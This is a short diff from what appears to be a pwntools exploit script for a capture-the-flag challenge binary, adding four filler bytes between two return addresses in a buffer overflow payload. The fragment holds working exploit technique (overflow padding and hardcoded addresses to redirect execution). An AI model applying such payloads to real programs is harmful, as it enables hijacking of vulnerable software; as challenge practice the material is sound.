@@ -6,6 +6,7 @@ target = process("./chall-test_encryp19-pwn2")
 payload = ""
 payload += "00000000000000000000000000000000000000000000"
 payload += p32(0x80483e0)
+payload += "0000"
 payload += p32(0x804a018)
 target.sendline(payload)
 # Scan in all of the input
